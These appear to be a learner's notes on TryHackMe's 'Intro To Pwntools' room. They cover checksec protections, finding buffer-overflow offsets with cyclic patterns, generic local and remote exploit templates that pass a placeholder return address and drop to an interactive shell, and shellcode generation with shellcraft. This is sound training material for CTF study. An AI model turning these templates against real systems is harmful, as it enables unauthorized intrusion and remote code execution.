# 🧨 Intro To Pwntools — TryHackMe Notes

**Room:** Intro To Pwntools  
**Platform:** TryHackMe  
**Category:** Binary Exploitation  
**Tool Focus:** Pwntools  

---

## 📌 Overview

This room introduces **Pwntools**, a Python framework used for exploit development and Capture The Flag (CTF) challenges.

Main objectives:

- Understand binary protections
- Identify and exploit buffer overflows
- Find exact overflow offsets using cyclic patterns
- Automate exploits using Python
- Connect to remote services
- Generate shellcode using shellcraft

---

# 🛠 Installation & Setup

## Install Pwntools

```bash
pip install pwntools

Test installation:

python3 -c "from pwn import *"
GDB + pwndbg (Recommended)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

pwndbg improves debugging by showing registers, stack, and memory clearly.

## Binary Protections (checksec)

Before exploiting, check protections:

checksec ./binary
Common Protections
Protection	Meaning
RELRO	Protects GOT from overwrite
Stack Canary	Detects stack smashing
NX	Non-executable stack
PIE	Randomizes base address
RWX	Read-Write-Execute memory

Understanding protections determines your exploitation approach.

## 💥 Buffer Overflow – Finding Offset
1️⃣ Generate Cyclic Pattern
cyclic 100

Or in Python:

from pwn import *
print(cyclic(100))
2️⃣ Crash Binary in GDB
gdb ./binary
run

Paste cyclic pattern as input.

After crash:

info registers

Look at EIP (32-bit) or RIP (64-bit).

3️⃣ Find Exact Offset

If EIP = 0x6161616c:

from pwn import *
print(cyclic_find(0x6161616c))

This gives the precise number of bytes needed to overwrite the instruction pointer.

🐍 Basic Local Exploit Script
from pwn import *

context.binary = './binary'
context.log_level = 'info'

p = process('./binary')

offset = cyclic_find(0x6161616c)

payload  = b"A" * offset
payload += p32(0xdeadbeef)  # Replace with correct return address

p.sendline(payload)
p.interactive()
🌐 Remote Exploitation
from pwn import *

conn = remote('10.10.10.10', 1337)

payload = b"A"*32 + p32(0xdeadbeef)

conn.sendline(payload)
conn.interactive()

Useful functions:

recv()

recvline()

recvuntil()

send()

sendline()

interactive()

## 🧬 Shellcraft — Generating Shellcode

Generate Linux shellcode:

shellcraft i386.linux.sh

In Python:

from pwn import *

shellcode = asm(shellcraft.sh())

⚠ Works only if NX is disabled or memory is executable.

# 🧠 Key Takeaways

Always run checksec first.
Use cyclic patterns to determine overflow offset.
Automate exploitation using Pwntools.
Debug locally before attacking remote service.
Understand memory layout (stack, registers, return address).


# 🏁 Conclusion

Pwntools simplifies exploit development by:
Handling byte packing (p32, p64)
Managing local and remote connections
Generating shellcode
Automating payload construction
Mastering Pwntools is essential for CTF players and aspiring exploit developers